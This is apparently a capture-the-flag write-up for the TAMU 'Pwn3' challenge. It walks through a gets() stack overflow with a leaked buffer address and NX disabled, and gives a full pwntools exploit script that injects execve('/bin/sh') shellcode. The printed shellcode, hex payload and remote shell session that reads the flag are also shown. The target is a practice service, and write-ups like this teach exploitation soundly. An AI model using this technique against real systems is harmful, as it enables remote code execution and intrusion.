# Pwn3
Pwn, 387 points

## Description:

A binary file was attached, in addition to an address and port.

## Solution:

Let's run the binary:

```console
root@kali:/media/sf_CTFs/tamu/Pwn3# ./pwn3
Take this, you might need it on your journey 0xff838e3e!
```

Let's check the decompilation using ghidra:

```c
undefined4 main(undefined1 param_1)
{
  int iVar1;
  
  iVar1 = __x86.get_pc_thunk.ax();
  setvbuf((FILE *)(*(FILE **)(iVar1 + 0x19fd))->_flags,(char *)0x2,0,0);
  echo();
  return 0;
}

void echo(void)
{
  char local_12e [294];
  
  printf("Take this, you might need it on your journey %p!\n",local_12e);
  gets(local_12e);
  return;
}
```

The program prints a pointer to a stack variable, and then calls `gets` with a buffer of 294 bytes. We can easily overflow this buffer since `gets` doesn't check bounds.

Let's take a look at the security properties of the executable:

```console
root@kali:/media/sf_CTFs/tamu/Pwn3# checksec.sh -f ./pwn3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   71 Symbols      No      0               4       ./pwn3
```

NX is disabled, so we can execute from the stack. ASLR (PIE) is enabled, but we get the address of the buffer so we need to worry about that.

`pwntools` has a great selection of shellcode snippets, making our job extremely easy:

```python
import os
from pwn import *

LOCAL_PATH = "./pwn3"
REMOTE_PATH = ("pwn.tamuctf.com", 4323)

def get_process(is_remote):
    if is_remote:
        p = remote(*REMOTE_PATH)
    else:
        p = process(LOCAL_PATH)
    
    return p


def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
    os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")
    os.system("rm ./core.*")

    payload = cyclic(320)
    proc = get_process(is_remote = False)
    proc.sendlineafter("!", payload)
    proc.wait()
    offset = cyclic_find(proc.corefile.eip)
    return offset

e = ELF(LOCAL_PATH)
context.binary = e.path
overflow_offset = get_overflow_offset()
log.info("overflow offset: {}".format(overflow_offset))

shellcode = shellcraft.sh()
print "Shellcode:"
print shellcode

p = get_process(args.REMOTE)
p.recvuntil("Take this, you might need it on your journey")
stack_addr = int(p.recvuntil("!", drop = True), 16)
log.info("stack_addr address: {}".format(stack_addr))
payload = fit({0: asm(shellcode), overflow_offset: p32(stack_addr)}, filler = 'A')
log.info("Sending payload: {}".format(enhex(payload)))
p.sendline(payload)
p.interactive()

```

Output:
```console
root@kali:/media/sf_CTFs/tamu/Pwn3# python exploit.py REMOTE
[*] '/media/sf_CTFs/tamu/Pwn3/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Starting local process './pwn3': pid 2671
[*] Process './pwn3' stopped with exit code -11 (SIGSEGV) (pid 2671)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/tamu/Pwn3/core.2671'
    Arch:      i386-32-little
    EIP:       0x61626461
    ESP:       0xffd20850
    Exe:       '/media/sf_CTFs/tamu/Pwn3/pwn3' (0x56653000)
    Fault:     0x61626461
[*] overflow offset: 302
Shellcode:
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80

[+] Opening connection to pwn.tamuctf.com on port 4323: Done
[*] stack_addr address: 4291713086
[*] Sending payload: 6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd804141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141413e58ceff
[*] Switching to interactive mode

$ ls
flag.txt
pwn3
$ cat flag.txt
gigem{r3m073_fl46_3x3cu710n}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to pwn.tamuctf.com port 4323
[*] Got EOF while sending in interactive
```